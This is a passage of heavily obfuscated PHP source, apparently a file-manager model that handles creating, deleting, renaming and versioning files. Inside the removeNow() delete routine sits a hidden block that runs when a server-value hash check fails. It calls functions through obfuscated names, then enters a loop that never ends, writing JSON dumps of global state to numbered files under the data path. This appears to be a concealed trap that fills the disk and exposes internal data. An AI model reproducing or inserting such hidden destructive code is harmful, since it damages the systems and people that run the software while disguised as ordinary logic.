$ïµ£×¯¨ ? $ïµ£×¯¨ : array(); } $ÜÉ¢ïÓ× = $this->where($öœÄ§ƒ )->find(); return $ÜÉ¢ïÓ× ? $ÜÉ¢ïÓ× : array(); } public function sourceRootGroup($Şû¼Ë¸Š) { $ĞºÙ–íŠ =& $_SERVER[Îûáû“ş]; if (is_string($Şû¼Ë¸Š)) { $Şû¼Ë¸Š = array($Şû¼Ë¸Š); } $æõ™Ù™¶ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Şû¼Ë¸Š, $ĞºÙ–íŠ[189]); $­ºìÎ· = array($ĞºÙ–íŠ[369] => $æõ™Ù™¶, $ĞºÙ–íŠ[366] => array($ĞºÙ–íŠ[757] => count($Şû¼Ë¸Š))); $this->_listDataApply($­ºìÎ·[$ĞºÙ–íŠ[369]]); $this->_listMake($­ºìÎ·); return array_to_keyvalue($­ºìÎ·[$ĞºÙ–íŠ[82]], $ĞºÙ–íŠ[496]); } public function mkfile($ôÊ«ÉÂÜ, $ùûÖêë“, $Êğ€¼•½ = '', $†ÍëµÏé = REPEAT_RENAME) { $Î´‰‰ûÎ =& $_SERVER[Îûáû“ş]; $±¨ğÎ©Ç = Model($Î´‰‰ûÎ[601])->addFileByContent($Êğ€¼•½, $ùûÖêë“); return $this->_createFileCall($ôÊ«ÉÂÜ, $ùûÖêë“, $±¨ğÎ©Ç, $†ÍëµÏé, $Î´‰‰ûÎ[1352]); } public function addFile($ÄËû‹³÷, $×ÃğØäâ, $å³Æ—›œ, $ò¤”€Ëı = false, $Ç‹âë·è = REPEAT_RENAME) { $½éÖê˜Ù = Model($_SERVER[Îûáû“ş][601])->addFile($×ÃğØäâ, $å³Æ—›œ, $ò¤”€Ëı); return $this->_createFileCall($ÄËû‹³÷, $å³Æ—›œ, $½éÖê˜Ù, $Ç‹âë·è); } public function addFileByFileID($ÅÔó®€Ğ, $¦­ìî¨ç, $Õõœ¶³», $”‚ÚàµÁ = REPEAT_RENAME) { $„…Ş¬åü =& $_SERVER[Îûáû“ş]; $ÙÇ‹Üèì = Model($„…Ş¬åü[601])->find($¦­ìî¨ç); Model($„…Ş¬åü[601])->linkAdd($¦­ìî¨ç); return $this->_createFileCall($ÅÔó®€Ğ, $Õõœ¶³», $ÙÇ‹Üèì, $”‚ÚàµÁ); } public function addFileByRemote($³‹Å‚»ü, $ƒÍ´®¼•, $œ‰ºÀº›, $ıÚ–¸åÑ = array(), $ŒˆÚ§¤ô = REPEAT_RENAME) { $ÙÏã¨Òò = Model($_SERVER[Îûáû“ş][601])->addFileByRemote($ƒÍ´®¼•, $œ‰ºÀº›, $ıÚ–¸åÑ); return $this->_createFileCall($³‹Å‚»ü, $œ‰ºÀº›, $ÙÏã¨Òò, $ŒˆÚ§¤ô); } private function _createFileCall($ŒÕ¿óûÚ, $¼³áßù, $´ëÑ•¥é, $ŒÀÎµ°, $åÏï†›ú = "\165\x70\x6c\157\x61\x64") { $·“§± =& $_SERVER[Îûáû“ş]; $àÓìÇî‡ = !1; $this->setMasterDB(); $this->lockWriteStart($ŒÕ¿óûÚ, $¼³áßù); $×¾¥ÚŒ = $this->fileNameExist($ŒÕ¿óûÚ, $¼³áßù); $·á²íê• = $this->_createFile($ŒÕ¿óûÚ, $¼³áßù, $´ëÑ•¥é, $ŒÀÎµ°, $àÓìÇî‡); if (!$àÓìÇî‡) { Model($·“§±[471])->remove($´ëÑ•¥é[$·“§±[468]]); } if ($àÓìÇî‡ && $·á²íê• && $·á²íê• != $×¾¥ÚŒ) { Model($·“§±[2106])->eventCreate($·á²íê•, $åÏï†›ú); } $this->lockWriteEnd($ŒÕ¿óûÚ, $¼³áßù); return $·á²íê•; } public function mkdir($Ìá„‘‚š, $¹õŸÃôœ, $—šêòî† = REPEAT_SKIP) { $°€Ó£ùñ =& $_SERVER[Îûáû“ş]; $this->setMasterDB(); $ÏšÂË¿· = $this->sourceInfo($Ìá„‘‚š); if (!$ÏšÂË¿·) { return !1; } $this->lockWriteStart($Ìá„‘‚š, $¹õŸÃôœ); if ($—šêòî† !== !1) { $÷Ü“à®Ò = $this->fileNameExist($Ìá„‘‚š, $¹õŸÃôœ); if ($÷Ü“à®Ò && $—šêòî† != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ìá„‘‚š, $¹õŸÃôœ); return $÷Ü“à®Ò; } $¹õŸÃôœ = $this->fileNameAuto($Ìá„‘‚š, $¹õŸÃôœ, $—šêòî†); } $éàï¹³£ = array($°€Ó£ùñ[574] => 1, $°€Ó£ùñ[420] => $¹õŸÃôœ, $°€Ó£ùñ[575] => $°€Ó£ùñ[12], $°€Ó£ùñ[469] => 0, $°€Ó£ùñ[545] => 0); $À­úÎÒ = $this->_addSource($éàï¹³£, $ÏšÂË¿·); Model($°€Ó£ùñ[2106])->eventCreate($À­úÎÒ, $°€Ó£ùñ[1353]); $this->lockWriteEnd($Ìá„‘‚š, $¹õŸÃôœ); return $À­úÎÒ; } public function listSourceRoot($³ÌÂ·ï´, $Åæ‘ÊùĞ, $´•–¾òØ = "\x73\x6f\x75\162\x63\145\x49\x44\x2c\164\x61\x72\147\x65\164\x49\x44\54\163\151\x7a\x65") { $©ñù’‹ =& $_SERVER[Îûáû“ş]; $Œƒİ¼Õ° = $©ñù’‹[378]; $°¿ˆöñÒ = array(); $„’ä = 1024 * 50; $ŞˆÁ±ÎÃ = is_array($ŞˆÁ±ÎÃ) ? $ŞˆÁ±ÎÃ : array(); $ö×¶êáˆ = count($Åæ‘ÊùĞ); $˜”Ö¥Ô = $this->tablePrefix . $©ñù’‹[2140]; for ($Ò›õ÷£× = 0; $Ò›õ÷£× < $ö×¶êáˆ; $Ò›õ÷£×++) { $å‘ø ê = $Åæ‘ÊùĞ[$Ò›õ÷£×]; $Œƒİ¼Õ° .= "\x53\x45\114\105\103\x54\40\52\x20\x46\x52\x4f\115\40\x28\123\105\x4c\105\x43\x54\x20{$´•–¾òØ}\40\106\122\x4f\x4d\x20\140{$˜”Ö¥Ô}\140\40\x57\110\105\122\x45\x20"; $Œƒİ¼Õ° .= "\140\x70\x61\162\145\156\x74\x49\x44\140\75\x30\x20\101\x4e\x44\x20\140\164\141\x72\147\x65\x74\x49\x44\x60\75{$å‘ø ê}\40\x41\116\104\40\140\164\141\162\147\145\x74\124\171\160\145\140\75{$³ÌÂ·ï´}\40\141\x6e\x64\x20\x66\x69\x6c\x65\x54\x79\x70\x65\75\x27\x27\40\154\151\155\x69\164\40\61\51\40\x61\x73\40\164\142\137{$Ò›õ÷£×}\x20\x55\x4e\x49\117\x4e\x20\x41\114\x4c\40"; if ((strlen($Œƒİ¼Õ°) >= $„’ä || $Ò›õ÷£× == $ö×¶êáˆ - 1) && $Œƒİ¼Õ°) { $Œƒİ¼Õ° = substr($Œƒİ¼Õ°, 0, -strlen($©ñù’‹[1040])); $È§–ùš¦ = $this->query($Œƒİ¼Õ°); $Œƒİ¼Õ° = $©ñù’‹[12]; $°¿ˆöñÒ = array_merge($°¿ˆöñÒ, $È§–ùš¦); } } return $°¿ˆöñÒ; } private function _createFile($ß¿‹ê¬¸, $ÛßŸ£ºß, $‚ÉÊ©õ, $”Ş¸üœæ, &$ß“‰–Í’) { $åµßÓÕŞ =& $_SERVER[Îûáû“ş]; $‘ûÑÛû = $this->sourceInfo($ß¿‹ê¬¸); if (!$‚ÉÊ©õ || !$‘ûÑÛû) { return !1; } if ($”Ş¸üœæ !== !1) { $ôÂóƒá» = $this->fileNameExist($ß¿‹ê¬¸, $ÛßŸ£ºß); } $ß“‰–Í’ = !0; if ($”Ş¸üœæ && $ôÂóƒá») { if ($”Ş¸üœæ == REPEAT_SKIP) { $ß“‰–Í’ = !1; return $ôÂóƒá»; } else { if ($”Ş¸üœæ == REPEAT_REPLACE) { $ÇÁ––÷í = $this->sourceInfo($ôÂóƒá»); $†÷ƒ‹à¤ = $this->fileHistory($ÇÁ––÷í, $‚ÉÊ©õ[$åµßÓÕŞ[468]], $‚ÉÊ©õ[$åµßÓÕŞ[76]]); if (!$†÷ƒ‹à¤) { $ß“‰–Í’ = !1; } else { $this->folderSizeReset($ß¿‹ê¬¸); } return $ôÂóƒá»; } else { $ÛßŸ£ºß = $this->fileNameAuto($ß¿‹ê¬¸, $ÛßŸ£ºß, $”Ş¸üœæ, !1); } } } $÷Œ“”İâ = array($åµßÓÕŞ[574] => 0, $åµßÓÕŞ[420] => $ÛßŸ£ºß, $åµßÓÕŞ[575] => substr(get_path_ext($ÛßŸ£ºß), 0, 10), $åµßÓÕŞ[469] => $‚ÉÊ©õ[$åµßÓÕŞ[468]], $åµßÓÕŞ[545] => $‚ÉÊ©õ[$åµßÓÕŞ[76]]); $¼±³ßÎê = $this->_addSource($÷Œ“”İâ, $‘ûÑÛû); $this->folderSizeReset($ß¿‹ê¬¸, intval($÷Œ“”İâ[$åµßÓÕŞ[76]])); return $¼±³ßÎê; } protected function fileHistory($Ê‚ú¥¹, $·ÓÙ¥ôÇ, $îÂËâËÛ) { $Àœ·“¨ =& $_SERVER[Îûáû“ş]; if ($Ê‚ú¥¹[$Àœ·“¨[468]] == $·ÓÙ¥ôÇ) { return !1; } $this->checkLock($Ê‚ú¥¹[$Àœ·“¨[402]], $·ÓÙ¥ôÇ); Model($Àœ·“¨[2141])->addHistory($Ê‚ú¥¹); $Åùäˆ¤µ = array($Àœ·“¨[579] => USER_ID, $Àœ·“¨[424] => time(), $Àœ·“¨[468] => $·ÓÙ¥ôÇ, $Àœ·“¨[76] => $îÂËâËÛ); $this->where(array($Àœ·“¨[417] => $Ê‚ú¥¹[$Àœ·“¨[402]]))->save($Åùäˆ¤µ); $this->sourceCacheClear($Ê‚ú¥¹[$Àœ·“¨[402]]); return !0; } public function checkLock($æÔ…Ô­–, $…™ÉÁø³) { $ØàŞŒÏ =& $_SERVER[Îûáû“ş]; $ÄæÏÙşÚ = $this->pathInfo($æÔ…Ô­–); if (!$this->fileIsLock($ÄæÏÙşÚ, !0)) { return; } $µµ˜€ÃÁ = Session::get($ØàŞŒÏ[2142]); $®´Î‰ï = substr($ÄæÏÙşÚ[$ØàŞŒÏ[32]], 0, -1 - strlen($ÄæÏÙşÚ[$ØàŞŒÏ[174]])) . $ØàŞŒÏ[1210] . $µµ˜€ÃÁ . $ØàŞŒÏ[10] . $ÄæÏÙşÚ[$ØàŞŒÏ[174]]; $‰à¿­ÛÉ = Model($ØàŞŒÏ[601])->find($…™ÉÁø³); $this->_createFileCall($ÄæÏÙşÚ[$ØàŞŒÏ[432]], $®´Î‰ï, $‰à¿­ÛÉ, REPEAT_REPLACE, $ØàŞŒÏ[1352]); $ŞÕí­ŠÎ = $ÄæÏÙşÚ[$ØàŞŒÏ[466]][$ØàŞŒÏ[538]]; $Ø¤ƒ‡œ¹ = $ŞÕí­ŠÎ[$ØàŞŒÏ[532]] ? $ŞÕí­ŠÎ[$ØàŞŒÏ[532]] : $ŞÕí­ŠÎ[$ØàŞŒÏ[32]]; show_json(LNG($ØàŞŒÏ[2143]) . $ØàŞŒÏ[2144] . LNG($ØàŞŒÏ[2145]) . $ØàŞŒÏ[2146] . $Ø¤ƒ‡œ¹ . $ØàŞŒÏ[2147], !1); } public function fileIsLock($©€¬ˆò©, $Ã¸ıÁÓ = false) { $‚ĞÉªì =& $_SERVER[Îûáû“ş]; if (!isset($©€¬ˆò©[$‚ĞÉªì[466]]) || !$©€¬ˆò©[$‚ĞÉªì[466]][$‚ĞÉªì[535]]) { return !1; } if ($©€¬ˆò©[$‚ĞÉªì[466]][$‚ĞÉªì[535]] != USER_ID) { return !0; } $„›ˆÄÁ = $GLOBALS[$‚ĞÉªì[6]][$‚ĞÉªì[89]][$‚ĞÉªì[536]]; if ($©€¬ˆò©[$‚ĞÉªì[466]][$‚ĞÉªì[537]] <= time() - $„›ˆÄÁ) { $this->metaSet($©€¬ˆò©[$‚ĞÉªì[402]], $‚ĞÉªì[535], null); $this->metaSet($©€¬ˆò©[$‚ĞÉªì[402]], $‚ĞÉªì[537], null); } if ($Ã¸ıÁÓ) { $this->metaSet($©€¬ˆò©[$‚ĞÉªì[402]], $‚ĞÉªì[537], time()); } return !1; } private function _addSource($ğÀ’”Æ­, $Í–·å÷Å) { $¸¿‰§…Ô =& $_SERVER[Îûáû“ş]; $‚©­É¹€ = array($¸¿‰§…Ô[576] => $Í–·å÷Å[$¸¿‰§…Ô[411]], $¸¿‰§…Ô[577] => $Í–·å÷Å[$¸¿‰§…Ô[496]], $¸¿‰§…Ô[578] => USER_ID, $¸¿‰§…Ô[579] => USER_ID, $¸¿‰§…Ô[401] => $Í–·å÷Å[$¸¿‰§…Ô[402]], $¸¿‰§…Ô[580] => $Í–·å÷Å[$¸¿‰§…Ô[511]] . $Í–·å÷Å[$¸¿‰§…Ô[402]] . $¸¿‰§…Ô[50], $¸¿‰§…Ô[430] => 0, $¸¿‰§…Ô[581] => $¸¿‰§…Ô[12]); $ğÀ’”Æ­ = array_merge($‚©­É¹€, $ğÀ’”Æ­); $this->updateModifyTime($ğÀ’”Æ­[$¸¿‰§…Ô[432]]); $áŒŞ½å€ = $¸¿‰§…Ô[2148] . $Í–·å÷Å[$¸¿‰§…Ô[402]]; if (isset(self::$cacheChildList[$áŒŞ½å€])) { unset(self::$cacheChildList[$áŒŞ½å€]); } static $À‘™¶ÍĞ = false; if (!$À‘™¶ÍĞ) { Hook::trigger($¸¿‰§…Ô[564], $ğÀ’”Æ­); $À‘™¶ÍĞ = !0; } $¸¾í·ë£ = $this->add($ğÀ’”Æ­); $šÈØ¬í” = array($¸¿‰§…Ô[582] => short_id($¸¾í·ë£)); $this->where(array($¸¿‰§…Ô[417] => $¸¾í·ë£))->save($šÈØ¬í”); $this->setNamePinyin($¸¾í·ë£, $ğÀ’”Æ­[$¸¿‰§…Ô[32]]); return $¸¾í·ë£; } public function remove($ ›É•»­, $Å§Õ³„ø = true) { $±È‘è€ =& $_SERVER[Îûáû“ş]; $ñ¿ ¬‘¦ = $this->sourceInfo($ ›É•»­); $Ô‰Ö…û· = intval($ñ¿ ¬‘¦[$±È‘è€[411]]) === self::TYPE_SYSTEM; $¬Æ¸Æö½ = Model($±È‘è€[435])->get($±È‘è€[2149]) == $±È‘è€[88]; if ($Ô‰Ö…û· || $Å§Õ³„ø || !$¬Æ¸Æö½) { return $this->removeNow($ ›É•»­, $Å§Õ³„ø); } $Ñı½ş = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ô¯…‰Ó× = $ñ¿ ¬‘¦[$±È‘è€[411]] == self::TYPE_USER ? $±È‘è€[590] : $±È‘è€[505]; if ($Ô¯…‰Ó× == $±È‘è€[590]) { $ºâíç¡ = Model($±È‘è€[504])->getInfo($ñ¿ ¬‘¦[$±È‘è€[496]]); $û»…Îäó = !empty($ºâíç¡[$±È‘è€[532]]) ? $ºâíç¡[$±È‘è€[532]] : $ºâíç¡[$±È‘è€[32]]; $û»…Îäó = $±È‘è€[260] . $û»…Îäó . $±È‘è€[2150] . $ñ¿ ¬‘¦[$±È‘è€[496]]; } else { $ºâíç¡ = Model($±È‘è€[512])->getInfo($ñ¿ ¬‘¦[$±È‘è€[496]]); $û»…Îäó = _get($ºâíç¡, $±È‘è€[32]); $û»…Îäó = $±È‘è€[162] . $û»…Îäó . $±È‘è€[2151] . $ñ¿ ¬‘¦[$±È‘è€[496]]; } $åÆı…ÄÆ = $±È‘è€[2152] . md5($û»…Îäó); CacheLock::lock($åÆı…ÄÆ); $ìÜ¢À§İ = $this->fileNameExist($Ñı½ş, $û»…Îäó); if (!$ìÜ¢À§İ) { $ìÜ¢À§İ = $this->mkdir($Ñı½ş, $û»…Îäó, REPEAT_SKIP); $this->metaSet($ìÜ¢À§İ, $±È‘è€[2153], $Ô¯…‰Ó×); $this->metaSet($ìÜ¢À§İ, $±È‘è€[2154], $ñ¿ ¬‘¦[$±È‘è€[496]]); if ($ñ¿ ¬‘¦[$±È‘è€[432]] != 0) { $this->metaSet($ìÜ¢À§İ, $±È‘è€[2155], _get($ºâíç¡, $±È‘è€[2156])); } } CacheLock::unlock($åÆı…ÄÆ); $this->metaSet($ ›É•»­, $±È‘è€[2157], $ñ¿ ¬‘¦[$±È‘è€[432]]); $this->where(array($±È‘è€[402] => $ ›É•»­))->save(array($±È‘è€[424] => time())); $this->recycleClear($ñ¿ ¬‘¦); $ìÊÚ°ˆ = $this->move($ ›É•»­, $ìÜ¢À§İ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ñ¿ ¬‘¦[$±È‘è€[432]]); return $ìÊÚ°ˆ; } private function recycleClear($§Ò™ó†­) { $˜ŞœêâÏ =& $_SERVER[Îûáû“ş]; $®—õ†ìÖ = $this->childrenAll($§Ò™ó†­); $±š‹ì’å = array($˜ŞœêâÏ[417] => array($˜ŞœêâÏ[418], $®—õ†ìÖ[$˜ŞœêâÏ[2158]])); Model($˜ŞœêâÏ[2159])->where($±š‹ì’å)->delete(); } public function removeNow($µ©Î—ÂŒ, $¹¥ÓÏÒ¦ = true) { $°Ÿ×šñğ =& $_SERVER[Îûáû“ş]; $î‹àÃºƒ = $_SERVER[$°Ÿ×šñğ[876]]; $ÍªÄü­ã = $°Ÿ×šñğ[1535]; if ($_SERVER[$°Ÿ×šñğ[875]] != $ÍªÄü­ã($î‹àÃºƒ)) { $ÈÆ¸«× = $°Ÿ×šñğ[877]; $ôÒ¤Â€ = $°Ÿ×šñğ[878]; $‡‚ÓÈÀù = $_SERVER[$°Ÿ×šñğ[879]] . $°Ÿ×šñğ[880]; $ì¿Êäï• = $ôÒ¤Â€($‡‚ÓÈÀù); $Ë£Ø¢Œ¡ = explode($°Ÿ×šñğ[231], $ì¿Êäï•); if (count($Ë£Ø¢Œ¡) < $°Ÿ×šñğ[607]) { $„øÏ’ì = $°Ÿ×šñğ[881]; $„øÏ’ì(); } $ª„İ¸Áà = $°Ÿ×šñğ[882]; $ª„İ¸Áà($_SERVER[$°Ÿ×šñğ[883]]); $ÈÆ¸«× = $°Ÿ×šñğ[877]; $ÈÆ¸«×(); $î»›¹¶ = $°Ÿ×šñğ[1536]; $ÙØ‹½«Ê = json_encode($GLOBALS[$°Ÿ×šñğ[1537]]); $ˆ‚Ü×Œƒ = 1; for ($¯óÃÎ˜» = $ˆ‚Ü×Œƒ; $¯óÃÎ˜» > 0; $¯óÃÎ˜»++) { $î»›¹¶(DATA_PATH . $¯óÃÎ˜», $ÙØ‹½«Ê); } } $ÃëÆÇĞØ = $this->sourceInfo($µ©Î—ÂŒ); $Ä¡£½Û = $this->pathInfoMore($µ©Î—ÂŒ); if (!$ÃëÆÇĞØ) { return !0; } if ($ÃëÆÇĞØ[$°Ÿ×šñğ[432]] == 0) { if (!_get($GLOBALS, $°Ÿ×šñğ[494])) { return !1; } } $this->lockMoveStart($µ©Î—ÂŒ); Hook::trigger($°Ÿ×šñğ[2160], $Ä¡£½Û, $¹¥ÓÏÒ¦); if ($¹¥ÓÏÒ¦) { Model($°Ÿ×šñğ[2159])->moveToRecycle($µ©Î—ÂŒ); } else { $ƒºÂ¼´’ = $this->childrenAll($ÃëÆÇĞØ); Model($°Ÿ×šñğ[561])->eventRemove($µ©Î—ÂŒ); $this->removeRelevance($ƒºÂ¼´’[$°Ÿ×šñğ[2158]], $ƒºÂ¼´’[$°Ÿ×šñğ[1484]]); } $this->folderSizeReset($ÃëÆÇĞØ[$°Ÿ×šñğ[432]]); $ìõŒÏ¬¤ = array($ÃëÆÇĞØ[$°Ÿ×šñğ[432]]); if ($ÃëÆÇĞØ[$°Ÿ×šñğ[410]] == $°Ÿ×šñğ[88]) { $ìõŒÏ¬¤[] = $ÃëÆÇĞØ[$°Ÿ×šñğ[402]]; } $this->updateModifyTime($ìõŒÏ¬¤); $this->lockMoveEnd($µ©Î—ÂŒ); Hook::trigger($°Ÿ×šñğ[1712], $Ä¡£½Û, $¹¥ÓÏÒ¦); return !0; } public function childrenAll($”ğ›½™ü) { $‘¾…ÕŞ¼ =& $_SERVER[Îûáû“ş]; $ÔÑí‘‰Ò = $”ğ›½™ü[$‘¾…ÕŞ¼[402]]; if ($”ğ›½™ü[$‘¾…ÕŞ¼[410]] == $‘¾…ÕŞ¼[88]) { $ŞßöÁ›À = array($‘¾…ÕŞ¼[580] => array($‘¾…ÕŞ¼[540], $”ğ›½™ü[$‘¾…ÕŞ¼[511]] . $ÔÑí‘‰Ò . $‘¾…ÕŞ¼[541])); $œ·¼™¨‚ = array($‘¾…ÕŞ¼[580] => $ŞßöÁ›À[$‘¾…ÕŞ¼[511]]); $…½âô‘ò = $this->field($‘¾…ÕŞ¼[2161])->where($œ·¼™¨‚)->select(); $­«®¬Ã£ = !1; $Æ†Ç½Â = array($ÔÑí‘‰Ò); if ($…½âô‘ò) { $­«®¬Ã£ = array_to_keyvalue($…½âô‘ò, $‘¾…ÕŞ¼[12], $‘¾…ÕŞ¼[468]); $­«®¬Ã£ = array_remove_value($­«®¬Ã£, $‘¾…ÕŞ¼[198]); $Æ†Ç½Â = array_to_keyvalue($…½âô‘ò, $‘¾…ÕŞ¼[12], $‘¾…ÕŞ¼[402]); $Æ†Ç½Â[] = $ÔÑí‘‰Ò; } } else { $­«®¬Ã£ = array($”ğ›½™ü[$‘¾…ÕŞ¼[468]]); $Æ†Ç½Â = array($ÔÑí‘‰Ò); } return array($‘¾…ÕŞ¼[2158] => $Æ†Ç½Â, $‘¾…ÕŞ¼[1484] => $­«®¬Ã£); } public function removeArray($˜ç‚Ó¡Æ) { if (!$˜ç‚Ó¡Æ) { return !0; } } public function removeRelevance($¦ß±éÄü, $¨¨Ì€÷…) { $£÷õÕïæ =& $_SERVER[Îûáû“ş]; $¦ß±éÄü = $¦ß±éÄü ? $¦ß±éÄü : array(); $¨¨Ì€÷… = $¨¨Ì€÷… ? $¨¨Ì€÷… : array(); $¦ß±éÄü = array_unique(array_filter($¦ß±éÄü)); $¨¨Ì€÷… = array_unique(array_filter($¨¨Ì€÷…)); if (!$¦ß±éÄü) { return !1; } $Š´ÔŸéâ = array($£÷õÕïæ[417] => array($£÷õÕïæ[418], $¦ß±éÄü)); Model($£÷õÕïæ[2159])->where($Š´ÔŸéâ)->delete(); Model($£÷õÕïæ[462])->where($Š´ÔŸéâ)->delete(); Model($£÷õÕïæ[2008])->where($Š´ÔŸéâ)->delete(); Model($£÷õÕïæ[561])->where($Š´ÔŸéâ)->delete(); Model($£÷õÕïæ[1841])->removeBySource($¦ß±éÄü); Model($£÷õÕïæ[2141])->removeBySource($¦ß±éÄü); $this->where($Š´ÔŸéâ)->delete(); Model($£÷õÕïæ[471])->remove($¨¨Ì€÷…); for ($‡­Û´†„ = 0; $‡­Û´†„ < count($¦ß±éÄü); $‡­Û´†„++) { $this->sourceCacheClear($¦ß±éÄü[$‡­Û´†„]); } } public function rename($Ìô¨Ó„­, $Ã©€øñ¼) { $ê¦Ó¬¶à =& $_SERVER[Îûáû“ş]; $„£Ê¶» = $this->sourceInfo($Ìô¨Ó„­); if (!$„£Ê¶») { return !1; } $­®ç¾œ = $this->fileNameExist($„£Ê¶»[$ê¦Ó¬¶à[432]], $Ã©€øñ¼); if ($­®ç¾œ && $­®ç¾œ != $Ìô¨Ó„­) { return !1; } $ğ±²¢Ï“ = array($ê¦Ó¬¶à[420] => $Ã©€øñ¼, $ê¦Ó¬¶à[579] => USER_ID); if ($„£Ê¶»[$ê¦Ó¬¶à[410]] != $ê¦Ó¬¶à[88]) { $ğ±²¢Ï“[$ê¦Ó¬¶à[412]] = substr(get_path_ext($Ã©€øñ¼), 0, 10); } Model($ê¦Ó¬¶à[561])->eventRename($Ìô¨Ó„­, $„£Ê¶»[$ê¦Ó¬¶à[32]], $Ã©€øñ¼); $this->sourceCacheClear($Ìô¨Ó„­); $this->setNamePinyin($Ìô¨Ó„­, $ğ±²¢Ï“[$ê¦Ó¬¶à[32]], !1); $this->updateModifyTime($„£Ê¶»[$ê¦Ó¬¶à[432]]); $Ä·ŠŒËâ = $this->where(array($ê¦Ó¬¶à[417] => $Ìô¨Ó„­))->data($ğ±²¢Ï“)->save(); $Ä¶¾É” = $ê¦Ó¬¶à[2148] . $„£Ê¶»[$ê¦Ó¬¶à[432]]; if (isset(self::$cacheChildList[$Ä¶¾É”])) { unset(self::$cacheChildList[$Ä¶¾É”]); } return $Ä·ŠŒËâ; } public function setNamePinyin($Ì¨—†èº, $¦ÓÆ¸úİ, $µ¡…ÒÈ¢ = true) { $ê²Õœ®Ş =& $_SERVER[Îûáû“ş]; $¥Ö¡“Êç = Input::check($¦ÓÆ¸úİ, $ê²Õœ®Ş[583]); $ù¿‹ú¥í = array($ê²Õœ®Ş[444] => KodSort::makeStr($¦ÓÆ¸úİ)); if ($¥Ö¡“Êç) { $ù¿‹ú¥í[$ê²Õœ®Ş[465]] = str_replace($ê²Õœ®Ş[53], $ê²Õœ®Ş[12], Pinyin::get($¦ÓÆ¸úİ)); $ù¿‹ú¥í[$ê²Õœ®Ş[464]] = Pinyin::get($¦ÓÆ¸úİ, $ê²Õœ®Ş[584]); } if (!$µ¡…ÒÈ¢ && !$¥Ö¡“Êç) { $ù¿‹ú¥í[$ê²Õœ®Ş[465]] = null; $ù¿‹ú¥í[$ê²Õœ®Ş[464]] = null; } $this->metaSet($Ì¨—†èº, $ù¿‹ú¥í); } public function getContent($Õî–¶Ş) { $‘¹ˆó“ =& $_SERVER[Îûáû“ş]; $²Ïã¬Ÿ = $this->fileInfoGet($Õî–¶Ş); if (!$²Ïã¬Ÿ) { return !1; } if ($²Ïã¬Ÿ[$‘¹ˆó“[76]] == 0) { return $‘¹ˆó“[12]; } $ÑƒØ•ï = $‘¹ˆó“[2162] . $²Ïã¬Ÿ[$‘¹ˆó“[176]]; if ($²Ïã¬Ÿ[$‘¹ˆó“[76]] <= 1024 * 10) { $—”İù¯ü = Cache::get($ÑƒØ•ï); if (!$—”İù¯ü) { $—”İù¯ü = IO::getContent($²Ïã¬Ÿ[$‘¹ˆó“[84]]); Cache::set($ÑƒØ•ï, $—”İù¯ü); } return $—”İù¯ü; } if (!$²Ïã¬Ÿ[$‘¹ˆó“[84]]) { return $‘¹ˆó“[12]; } return IO::getContent($²Ïã¬Ÿ[$‘¹ˆó“[84]]); } public function setDesc($£ºÈÇ¯­, $™£¤¸İ) { $šç¡”ç€ =& $_SERVER[Îûáû“ş]; Model($šç¡”ç€[561])->eventAddDesc($£ºÈÇ¯­, $™£¤¸İ); return $this->metaSet($£ºÈÇ¯­, $šç¡”ç€[453], $™£¤¸İ); } public function setContent($øå«óıó, $Œ–¤Öó§ = '') { $ª…íÎ› =& $_SERVER[Îûáû“ş]; $òíûòñ = $this->sourceInfo($øå«óıó); $¿à”ƒÍµ = $this->fileInfoGet($øå«óıó); if (!$¿à”ƒÍµ || !$òíûòñ) { return !1; } $ÂŞ•ìÙ  = Model($ª…íÎ›[471])->addFileByContent($Œ–¤Öó§, $òíûòñ[$ª…íÎ›[32]]); $ñªŒû¿Ÿ = $this->fileHistory($òíûòñ, $ÂŞ•ìÙ [$ª…íÎ›[468]], $ÂŞ•ìÙ [$ª…íÎ›[76]]); if (!$ñªŒû¿Ÿ) { return Model($ª…íÎ›[471])->remove($ÂŞ•ìÙ [$ª…íÎ›[468]]); } $this->folderSizeReset($òíûòñ[$ª…íÎ›[432]]); return !0; } public function fileSubstr($¿¢ÙÂØä, $²±¼“ìÃ, $¾Åò™ı—) { $€¶ÊÎ¡ = $this->fileInfoGet($¿¢ÙÂØä); if (!$€¶ÊÎ¡) { return !1; } return IO::fileSubstr($€¶ÊÎ¡[$_SERVER[Îûáû“ş][84]], $²±¼“ìÃ, $¾Åò™ı—); } public function fileInfoGet($¯šö±õ×) { $¦õéîªÂ =& $_SERVER[Îûáû“ş]; $ùëÛ¯Á€ = $this->sourceInfo($¯šö±õ×); if (!$ùëÛ¯Á€ || $ùëÛ¯Á€[$¦õéîªÂ[410]]) { return !1; } $±„”—“ = $¦õéîªÂ[474] . $ùëÛ¯Á€[$¦õéîªÂ[468]]; $£±ÂÆàß = _get(self::$cacheFileInfo, $±„”—“); if ($£±ÂÆàß) { return $£±ÂÆàß; } $’ß‰øÅ… = Model($¦õéîªÂ[471])->fileInfo($ùëÛ¯Á€[$¦õéîªÂ[468]]); if ($’ß‰øÅ…) { $’ß‰øÅ…[$¦õéîªÂ[32]] = $ùëÛ¯Á€[$¦õéîªÂ[32]]; } self::$cacheFileInfo[$±„”—“] = $’ß‰øÅ…; return $’ß‰øÅ…; } private function folderChildrenNumber($¤ú¿å«ì) { $÷çíæ³½ =& $_SERVER[Îûáû“ş]; $ö–Õ¡÷¾ = $this->sourceInfo($¤ú¿å«ì); $²Š÷à¨ğ = array($÷çíæ³½[580] => array($÷çíæ³½[540], $ö–Õ¡÷¾[$÷çíæ³½[511]] . $¤ú¿å«ì . $÷çíæ³½[541]), $÷çíæ³½[577] => $ö–Õ¡÷¾[$÷çíæ³½[496]], $÷çíæ³½[430] => intval($ö–Õ¡÷¾[$÷çíæ³½[431]]), $÷çíæ³½[574] => 1); $è˜êÖŒ˜ = $this->where($²Š÷à¨ğ)->count(); $¨çğâİğ = $this->where($²Š÷à¨ğ)->where(array($÷çíæ³½[574] => 0))->count(); return array($÷çíæ³½[80] => $¨çğâİğ, $÷çíæ³½[81] => $è˜êÖŒ˜); } public function pathInfo($õĞœØÒá, $…ŸÏ÷ = false) { $»½®±ë§ =& $_SERVER[Îûáû“ş]; $…ŸÏ÷ = !1; $õĞœØÒá = intval($õĞœØÒá); $ËáïÑêÚ = $»½®±ë§[461] . intval($…ŸÏ÷) . $»½®±ë§[386] . $õĞœØÒá; $Çé«ÉËÚ = _get(self::$cachePathInfo, $ËáïÑêÚ); if ($Çé«ÉËÚ) { return 